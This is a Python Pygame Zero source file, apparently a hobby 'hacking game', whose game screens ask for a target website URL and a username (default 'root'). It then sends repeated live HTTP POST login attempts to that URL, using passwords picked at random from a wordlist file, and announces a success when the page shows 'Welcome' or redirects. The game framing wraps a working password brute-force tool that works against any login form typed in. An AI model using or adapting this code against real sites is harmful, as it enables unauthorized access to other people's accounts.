import os
os.environ['SDL_VIDEO_WINDOW_POS'] = '100,100'
import random
import pgzrun
import pygame
import requests
import hashlib

random.seed()

pygame.mixer.music.load("song.mp3") #SubspaceAudio
pygame.mixer.music.play(-1)

level=-2
url="http://localhost"
username="root"
message=""
gemacht=False
password=""
gemacht=True

def brute_force(wordlist_file):
    global message, password
    with open(wordlist_file, "r", encoding="utf-8") as f:
        lines = f.readlines()
    temp = random.randint(0, len(lines)-1)
    password = lines[temp].strip()  # .strip() entfernt \n
    return password

def draw():
    global level, url,message,username
    screen.clear()
    if level==-2:
        screen.blit("disclaimer",(0,0))
    if level == -1:
        screen.blit("title", (0, 0))
    elif level == 0:
        screen.blit("intro", (0, 0))
    elif level == 1:
        screen.blit("back", (0, 0))
        screen.draw.text("Website to hack:", center=(400, 130), fontsize=24, color=(25, 200, 255))
        screen.draw.text(url, center=(400, 180), fontsize=24, color=(255, 255, 0))
    elif level == 2:
        screen.blit("back", (0, 0))
        screen.draw.text("Username:", center=(400, 130), fontsize=24, color=(25, 200, 255))
        screen.draw.text(username, center=(400, 180), fontsize=24, color=(255, 255, 0))
    elif level==3:
        screen.draw.text(message, center=(400, 130), fontsize=24, color=(225, 200, 255))

def on_key_down(key, unicode=None):
    global level, url
    if key==keys.ESCAPE:
        pygame.quit()
    if key == keys.BACKSPACE:
        url = ""
    elif key == keys.RETURN and level == 1:
        level = 2
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
    elif key==keys.RETURN and level==2:
        level=3
    elif unicode and key != keys.RETURN and level==1:
        url += unicode

def update():
    global level,password,url,message,gemacht
    if (level == 0 or level==-2) and keyboard.RETURN:
        level +=1
    elif level -1 and keyboard.space:
        level = 0
    if level==3 and gemacht:
        response = requests.post(url, data={"username": username, "password": brute_force("passlist.txt")})
        requests.post(url, data={"username": username, "password": brute_force("passlist.txt")})
        if "Welcome" in response.text or response.status_code == 302:
            message+=f"SUCCESS! Password is: {password}\n"
            gemacht=False
        else:
            message+=f"WRONG! Password is not: {password}\n"
    if level==3 and keyboard.space:
        level=0

pgzrun.go()
